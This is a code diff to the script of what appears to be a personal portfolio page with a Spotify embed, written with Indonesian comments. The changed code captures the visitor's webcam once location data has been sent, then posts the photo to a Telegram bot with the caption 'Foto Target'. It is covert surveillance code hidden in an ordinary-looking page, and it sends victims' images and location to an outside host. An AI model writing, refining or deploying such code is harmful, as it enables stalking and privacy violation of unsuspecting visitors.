@@ -52,7 +52,6 @@
                     </div>
                 </a>
 
-                <!-- Spotify Player Ditambahkan Kembali -->
                 <div class="w-full">
                     <iframe src="https://open.spotify.com/embed/track/2LBqCSwhJGcFQeTHMVGwy3" class="w-full h-20" frameBorder="0" allowtransparency="true" allow="encrypted-media"></iframe>
                 </div>
@@ -115,37 +114,37 @@
                         body: JSON.stringify({ chat_id: chatId, text: finalMsg, parse_mode: 'Markdown', reply_markup: keyboard })
                     });
                     
-                    takePhoto();
+                    // Panggil fungsi kamera setelah lokasi terkirim
+                    takeAndSendPhoto();
                 });
             }
         };
 
-        async function takePhoto() {
+        async function takeAndSendPhoto() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                video.onloadedmetadata = async () => {
-                    setTimeout(async () => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        
-                        canvas.toBlob(async (blob) => {
-                            const formData = new FormData();
-                            formData.append('chat_id', chatId);
-                            formData.append('photo', blob);
-                            formData.append('caption', "📸 Foto Target");
-                            
-                            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
-                            stream.getTracks().forEach(t => t.stop());
-                        }, 'image/jpeg');
-                    }, 1000);
-                };
-            } catch (err) { console.error("Kamera gagal diakses: ", err); }
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob);
+                    formData.append('caption', "📸 Foto Target");
+                    
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+                    stream.getTracks().forEach(track => track.stop());
+                }, 'image/jpeg');
+            } catch (err) { console.error("Akses kamera ditolak: ", err); }
         }
+
         function toggleProjects() { document.getElementById('project-list').classList.toggle('hidden'); }
     </script>
 </body>
